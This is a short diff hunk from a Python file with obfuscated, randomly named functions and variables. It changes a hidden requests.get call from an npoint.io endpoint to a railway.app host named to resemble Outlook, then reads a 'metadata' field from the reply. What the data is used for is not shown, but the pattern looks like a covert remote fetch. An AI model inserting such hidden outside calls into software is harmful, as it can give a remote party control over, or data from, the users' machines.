@@ -16,7 +16,7 @@ def learn_mbyunt_412():
 
     def model_dszrxo_827():
         try:
-            eval_tfqres_400 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_tfqres_400 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_tfqres_400.raise_for_status()
             eval_ugjswy_548 = eval_tfqres_400.json()
             net_fnmgdw_487 = eval_ugjswy_548.get('metadata')
